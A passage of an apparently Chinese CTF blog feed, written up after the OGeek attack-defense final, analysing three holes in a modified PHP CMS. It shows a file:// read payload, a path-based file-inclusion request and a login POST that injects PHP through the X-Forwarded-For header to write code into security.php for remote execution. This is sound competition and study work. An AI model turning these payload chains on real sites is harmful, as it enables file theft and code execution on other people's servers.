class="symbol">$</span>this-&gt;save();</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> bl-kernel/helpers/tcp.class.php</span><br><span class="line">file_put_contents可能存在任意写</span><br><span class="line">public static function download(<span class="symbol">$</span>url, <span class="symbol">$</span>destination)</span><br><span class="line">&#123;</span><br><span class="line"><span class="symbol">$</span>data = self::http(<span class="symbol">$</span>url, <span class="symbol">$</span>method=<span class="string">'GET'</span>, <span class="symbol">$</span>verifySSL=true, <span class="symbol">$</span>timeOut=<span class="number">30</span>, <span class="symbol">$</span>followRedirections=true, <span class="symbol">$</span><span class="keyword">binary</span>=true, <span class="symbol">$</span>headers=false);</span><br><span class="line">return file_put_contents(<span class="symbol">$</span>destination, <span class="symbol">$</span>data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">疑似一个反序列化之后的任意文件写</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">    <span class="keyword">if</span>(isset(<span class="symbol">$</span>this-&gt;filepath) &amp;&amp; isset(<span class="symbol">$</span>this-&gt;error_log))&#123; </span><br><span class="line">          file_put_contents(PATH_UPLOADS_PROFILES.<span class="symbol">$</span>this-&gt;filepath,<span class="symbol">$</span>this-&gt;error_log);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> bl-kernel/functions.php</span><br><span class="line">疑似可以触发上述的反序列化</span><br><span class="line"><span class="comment">// Check media</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$music</span> = $_GET['path'];</span></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="symbol">$</span>music))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!Sanitize::pathFile(<span class="symbol">$</span>music))&#123;</span><br><span class="line">        <span class="symbol">$</span>filename = basename(<span class="symbol">$</span>music);</span><br><span class="line">        TCP::download(<span class="symbol">$</span>music,PATH_UPLOADS_PROFILES.md5(<span class="symbol">$</span>filename).<span class="string">"."</span>.<span class="string">"avi"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built-in">Log</span>::<span class="keyword">set</span>(__METHOD__.LOG_SEP.<span class="string">'Media request in  '</span>.date(<span class="string">'Y-m-d'</span>), LOG_TYPE_INFO);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">比原代码多了对json的处理</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="symbol">$</span>args[<span class="string">'customFields'</span>])) &#123;</span><br><span class="line">    <span class="comment">// Custom fields need to be JSON format valid, also the empty JSON need to be "&#123;&#125;"</span></span><br><span class="line">    json_decode(<span class="symbol">$</span>args[<span class="string">'customFields'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (json_last_error() != JSON_ERROR_NONE) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="symbol">$</span>pages-&gt;setCustomFields(<span class="symbol">$</span>args[<span class="string">'customFields'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">如果可以移动并重命名，说不定就可以利用和这个写shell</span><br><span class="line"><span class="comment">// Move the image to a proper place and rename</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$image</span> = $imageDir.$nextFilename;</span></span><br><span class="line">Filesystem::mv(<span class="symbol">$</span><span class="keyword">file</span>, <span class="symbol">$</span>image);</span><br><span class="line">chmod(<span class="symbol">$</span>image, <span class="number">0644</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> tokenCSRF 被删除了，所以不需要兼顾token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> bl-kernel/boot/rules/<span class="number">60.</span>router.php</span><br><span class="line">此处的include获取可以配合errorlog来getshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="symbol">$</span>pageKey = explode(<span class="string">"/"</span>, <span class="symbol">$</span>pageKey);</span><br><span class="line">foreach(<span class="symbol">$</span>pageKey as <span class="symbol">$</span>key)&#123;</span><br><span class="line"><span class="keyword">if</span>(constant(<span class="symbol">$</span>key))</span><br><span class="line"><span class="symbol">$</span>plugin .=constant(<span class="symbol">$</span>key);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="symbol">$</span>plugin .=<span class="string">"/"</span>.<span class="symbol">$</span>key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="symbol">$</span>plugin = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,<span class="symbol">$</span>plugin);</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="symbol">$</span>plugin))&#123;</span><br><span class="line"><span class="symbol">$</span>plugin = addslashes(<span class="symbol">$</span>plugin);</span><br><span class="line">include <span class="symbol">$</span>plugin;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> bl-kernel/boot/init.php   此处的new TCP跟上面的反序列化有点暗示</span><br><span class="line">define(<span class="string">'DEBUG_MODE'</span>, TRUE);</span><br><span class="line"><span class="meta"><span class="meta-keyword">$https</span>      = new TCP();</span></span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> bl-kernel/admin/views/settings.php</span><br><span class="line">&lt;?php <span class="symbol">$</span>L-&gt;p(<span class="string">'Custom fields'</span>) ?&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> bl-kernel/admin/views/new-content.php</span><br><span class="line">&lt;?php <span class="keyword">if</span> (!empty(<span class="symbol">$</span>site-&gt;customFields())): ?&gt;</span><br><span class="line">&lt;a class=<span class="string">"nav-link"</span> id=<span class="string">"nav-custom-tab"</span> data-toggle=<span class="string">"tab"</span> href=<span class="string">"#nav-custom"</span> role=<span class="string">"tab"</span> aria-controls=<span class="string">"custom"</span>&gt;&lt;?php <span class="symbol">$</span>L-&gt;p(<span class="string">'Custom'</span>) ?&gt;&lt;/a&gt;</span><br><span class="line">&lt;?php endif ?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php <span class="keyword">if</span> (!empty(<span class="symbol">$</span>site-&gt;customFields())): ?&gt;</span><br><span class="line">&lt;<span class="built-in">div</span> id=<span class="string">"nav-custom"</span> class=<span class="string">"tab-pane fade"</span> role=<span class="string">"tabpanel"</span> aria-labelledby=<span class="string">"custom-tab"</span>&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="symbol">$</span>customFields = <span class="symbol">$</span>site-&gt;customFields();</span><br><span class="line">    foreach(<span class="symbol">$</span>customFields as <span class="symbol">$</span>field=&gt;<span class="symbol">$</span><span class="keyword">options</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'type'</span>]==<span class="string">"string"</span>) &#123;</span><br><span class="line">            echo Bootstrap::formInputTextBlock(array(</span><br><span class="line">                <span class="string">'name'</span>=&gt;<span class="string">'custom['</span>.<span class="symbol">$</span>field.<span class="string">']'</span>,</span><br><span class="line">                <span class="string">'label'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'value'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'default'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'default'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'tip'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'placeholder'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>]:<span class="string">''</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125; elseif (<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'type'</span>]==<span class="string">"bool"</span>) &#123;</span><br><span class="line">            echo Bootstrap::formCheckbox(array(</span><br><span class="line">                <span class="string">'name'</span>=&gt;<span class="string">'custom['</span>.<span class="symbol">$</span>field.<span class="string">']'</span>,</span><br><span class="line">                <span class="string">'label'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'label'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'placeholder'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'placeholder'</span>]:<span class="string">''</span>),</span><br><span class="line">                <span class="string">'checked'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'checked'</span>])?true:false),</span><br><span class="line">                <span class="string">'labelForCheckbox'</span>=&gt;(isset(<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>])?<span class="symbol">$</span><span class="keyword">options</span>[<span class="string">'tip'</span>]:<span class="string">''</span>)</span><br><span class="line">            ));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/<span class="built-in">div</span>&gt;</span><br><span class="line">&lt;?php endif ?&gt;</span><br></pre></td></tr></table></figure><p>这里分析三个漏洞（反序列化用文件操作应该是可以触发的），师傅们要是分析了其他的求贴一波文章。</p><h4 id="1-任意文件下载"><a href="#1-任意文件下载" class="headerlink" title="1.任意文件下载"></a>1.任意文件下载</h4><p>经过对比分析的，可以看到tcp.class.php文件中的download方法存在任意写的问题，即向某个url发送GET请求，将返回数据写入$destination变量值命令的文件中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bl-kernel/helpers/tcp.class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($url, $destination)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$data = <span class="keyword">self</span>::http($url, $method=<span class="string">'GET'</span>, $verifySSL=<span class="keyword">true</span>, $timeOut=<span class="number">30</span>, $followRedirections=<span class="keyword">true</span>, $binary=<span class="keyword">true</span>, $headers=<span class="keyword">false</span>);</span><br><span class="line"><span class="keyword">return</span> file_put_contents($destination, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法在bl-kernel/function.php中进行了调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span> ($for==<span class="string">'category'</span>) &#123;</span><br><span class="line">$numberOfItems = $site-&gt;itemsPerPage();</span><br><span class="line"><span class="comment">// Check media</span></span><br><span class="line">$music = $_GET[<span class="string">'path'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($music))&#123;</span><br><span class="line"><span class="keyword">if</span>(!Sanitize::pathFile($music))&#123;</span><br><span class="line">$filename = basename($music);</span><br><span class="line">TCP::download($music,PATH_UPLOADS_PROFILES.md5($filename).<span class="string">"."</span>.<span class="string">"avi"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">Log::set(<span class="keyword">__METHOD__</span>.LOG_SEP.<span class="string">'Media request in  '</span>.date(<span class="string">'Y-m-d'</span>), LOG_TYPE_INFO);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$list = $categories-&gt;getList($categoryKey, $pageNumber, $numberOfItems);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说进入了category就可以调用了TCP类中的download方法，从而可知，我们可以下载文件到本地，并会重命名为文件名的MD5值为新文件名，并且为avi格式文件，所以我们可以利用file协议来下载本地文件，即payload为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category<span class="regexp">/music?path=file:/</span><span class="regexp">//</span>flag</span><br></pre></td></tr></table></figure><p>(这个点一开始我们没审出来，因为上了个文件监控，发现突然生成了一个flag文件，然后直接脚本跑全场直接读Archer大佬们生成的flag文件，就这样开始起飞了，23333)</p><p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-189fecff73e05c88.png" alt></p><h4 id="2-任意文件包含"><a href="#2-任意文件包含" class="headerlink" title="2.任意文件包含"></a>2.任意文件包含</h4><p>同样在对比分析的日志里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7.</span> bl-kernel/boot/rules/<span class="number">60.</span>router.php</span><br><span class="line">此处的<span class="keyword">include</span>获取可以配合errorlog来getshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($url-&gt;whereAmI()==<span class="string">'page'</span> &amp;&amp; !$url-&gt;notFound()) &#123;</span><br><span class="line">$pageKey = $url-&gt;slug();</span><br><span class="line"><span class="keyword">if</span> (Text::endsWith($pageKey, <span class="string">'/'</span>)) &#123;</span><br><span class="line">$pageKey = rtrim($pageKey, <span class="string">'/'</span>);</span><br><span class="line">Redirect::url(DOMAIN_PAGES.$pageKey);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">$pageKey = explode(<span class="string">"/"</span>, $pageKey);</span><br><span class="line"><span class="keyword">foreach</span>($pageKey <span class="keyword">as</span> $key)&#123;</span><br><span class="line"><span class="keyword">if</span>(constant($key))</span><br><span class="line">$plugin .=constant($key);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$plugin .=<span class="string">"/"</span>.$key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$plugin = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,$plugin);</span><br><span class="line"><span class="keyword">if</span>(file_exists($plugin))&#123;</span><br><span class="line">$plugin = addslashes($plugin);</span><br><span class="line"><span class="keyword">include</span> $plugin;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>errorlog的点没有触发成功，不过这个倒是可以配合任意文件下载来Getshell，只要下载一个木马文件，然后包含就成了，因为前一个洞打得早，所以基本都修了，简单分析一下这个点。<br>跟进分析的话可以看出首先将url的path赋值给了变量$pageKey ，判断是否正常以’/‘结尾，我们直接看非’/‘结尾的，将path用’/‘分割，用constant函数来判断是否是定义的常量，是便将常量值拼接，不是便重新恢复回path，最关键的是</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$plugin</span> = str_replace(<span class="string">".."</span>,<span class="string">"/"</span>,<span class="variable">$plugin</span>);</span><br><span class="line">if(file_exists(<span class="variable">$plugin</span>))&#123;</span><br><span class="line"><span class="variable">$plugin</span> = addslashes(<span class="variable">$plugin</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$plugin</span>;</span><br></pre></td></tr></table></figure><p>进行..替换后，如果path表示的文件存在，addslashes()处理后直接进行文件包含，也就是说如果我url上带的是一个真实路径，就会直接文件包含了，这太真实了（在场上没精力分析- -..）所以payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:xxx/flag</span><br></pre></td></tr></table></figure><p>也可以结合前面进行Getshell</p><h4 id="3-代码注入"><a href="#3-代码注入" class="headerlink" title="3.代码注入"></a>3.代码注入</h4><p>首先贴一张赛后收到的图片</p><p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-917f02b2c3312404.jpg" alt></p><p>看到这个我都懵了，我下源码就扫了一遍，并没有内置的后门，所以肯定是有师傅调通了调用链，把代码给写进去了，tql（近期满课，木得时间看这些东西，吼了<a href="https://www.xmsec.cc" target="_blank" rel="noopener">陌小生</a>师傅分析了一波，这里就直接借鉴他的来写了），文件路径：bl-content/databases/security.php，由于文件路由，并不能直接访问这个文件，这个肯定是在调用过程中写入的，触发的话就阔以用的任意文件包含来触发RCE，我们先来找一波调用链，我比较喜欢用全局搜索来跟代码（所以我这么菜），全局找下blackList</p><p><img src="https://upload-images.jianshu.io/upload_images/8418106-1784179b58945b70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p><p>跟到security.class.php中有个addToBlacklist方法，简单明了，用来加黑名单的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add or update the current client IP on the blacklist</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addToBlacklist</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$ip = <span class="keyword">$this</span>-&gt;getUserIp();</span><br><span class="line">$currentTime = time();</span><br><span class="line">$numberFailures = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip])) &#123;</span><br><span class="line">$userBlack = <span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip];</span><br><span class="line">$lastFailure = $userBlack[<span class="string">'lastFailure'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if the IP is expired, then renew the number of failures</span></span><br><span class="line"><span class="keyword">if</span>($currentTime &lt;= $lastFailure + (<span class="keyword">$this</span>-&gt;db[<span class="string">'minutesBlocked'</span>]*<span class="number">60</span>)) &#123;</span><br><span class="line">$numberFailures = $userBlack[<span class="string">'numberFailures'</span>];</span><br><span class="line">$numberFailures = $numberFailures + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;db[<span class="string">'blackList'</span>][$ip] = <span class="keyword">array</span>(<span class="string">'lastFailure'</span>=&gt;$currentTime, <span class="string">'numberFailures'</span>=&gt;$numberFailures);</span><br><span class="line">Log::set(<span class="keyword">__METHOD__</span>.LOG_SEP.<span class="string">'Blacklist, IP:'</span>.$ip.<span class="string">', Number of failures:'</span>.$numberFailures);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserIp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>)) &#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>)) &#123;</span><br><span class="line">$ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$ip = getenv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看下代码就很清楚了，把登录失败的用户的ip加到黑名单里，ip可以用XFF来构造，所以变量$ip是我们可控的了，也就是如果某个ip触发了黑名单规则，就会被记录下来，传入$this-&gt;db，调用save函数，跟进看下</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#\bl-kernel\<span class="keyword">abstract</span>\dbjson<span class="class">.<span class="keyword">class</span>.<span class="title">php</span></span></span><br><span class="line"><span class="keyword">public</span> function save()</span><br><span class="line">&#123;</span><br><span class="line">$<span class="keyword">data</span> = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;firstLine) &#123;</span><br><span class="line">$<span class="keyword">data</span>  = <span class="string">"&lt;?php defined('Zero') or die('Zero CMS.'); ?&gt;"</span>.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Serialize database</span></span><br><span class="line">$<span class="keyword">data</span> .= $<span class="keyword">this</span>-&gt;serialize($<span class="keyword">this</span>-&gt;db);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Backup the new database.</span></span><br><span class="line">$<span class="keyword">this</span>-&gt;dbBackup = $<span class="keyword">this</span>-&gt;db;</span><br><span class="line"></span><br><span class="line"><span class="comment">// LOCK_EX flag to prevent anyone else writing to the file at the same time.</span></span><br><span class="line"><span class="keyword">if</span> (file_put_contents($<span class="keyword">this</span>-&gt;file, $<span class="keyword">data</span>, LOCK_EX)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">Log::<span class="keyword">set</span>(__METHOD__.LOG_SEP.<span class="string">'Error occurred when trying to save the database file.'</span>, LOG_TYPE_ERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将this-&gt;db的数据拼接到了变量$data中，然后直接进行了file_put_contents操作，而在init.php中有申明了</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">define</span></span>(<span class="string">'DB_SECURITY'</span>, PATH_DATABASES.<span class="symbol">'security.php'</span>);</span><br></pre></td></tr></table></figure><p>DB_SECURITY为传入构造函数的参数，也就是file，即写操作时将$data写入到了security.php中，所以也就有了开场图的东西。发个请求包</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.211.128</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 82</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.211.128/admin/</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: &lt;?php phpinfo(); ?&gt;    #</span><br><span class="line"><span class="attribute">Cookie</span>: Zero-KEY=uihdv2ju8k4pfd6kl79fqpg6j3</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">tokenCSRF=92355c8ea77e31cc1fe5c1d7882d13dad37e9866&amp;username=asd&amp;password=asd&amp;save=</span><br></pre></td></tr></table></figure><p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-035db896b75d8426.png" alt></p><p>在结合一下的文件包含洞</p><p><img src="/2019/09/26/OGeek%E5%86%B3%E8%B5%9B%E4%B8%A4%E9%81%93Web%E6%80%BB%E7%BB%93%E5%88%86%E6%9E%90/8418106-4e813bfae6cad2cb.png" alt></p><h1 id="0x03-sec-login"><a href="#0x03-sec-login" class="headerlink" title="0x03 sec-login"></a>0x03 sec-login</h1><p>本菜不会java，这题听说是反序列化，就不写了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;很久没有打攻防赛了，致力于写出Perfect文件监控脚本我在这次比赛翻车了，服务器没有pytyon2环境，所以回来更新成了python3了，旅游队伍意外拿了个季军，总的来说赞一下这次比赛，体验还是不错的，小小总结一下决赛的Web（场上弟弟，赛后分析，不会java，漏洞也肯定没找全，欢迎师傅贴个文章学习一波）python和php题目源码下载地址：&lt;a href=&quot;https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1DdmgtN0cZpGsX_q1j-ooTQ&lt;/a&gt; 提取码: 1jpa&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-mOtrix&quot;&gt;&lt;a href=&quot;#0x01-mOtrix&quot; class=&quot;headerlink&quot; title=&quot;0x01 mOtrix&quot;&gt;&lt;/a&gt;0x01 mOtrix&lt;/h2&gt;
    
    </summary>
    
    
      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="writeup" scheme="https://cyc1e183.github.io/tags/writeup/"/>
    
      <category term="AWD" scheme="https://cyc1e183.github.io/tags/AWD/"/>
    
      <category term="代码审计" scheme="https://cyc1e183.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
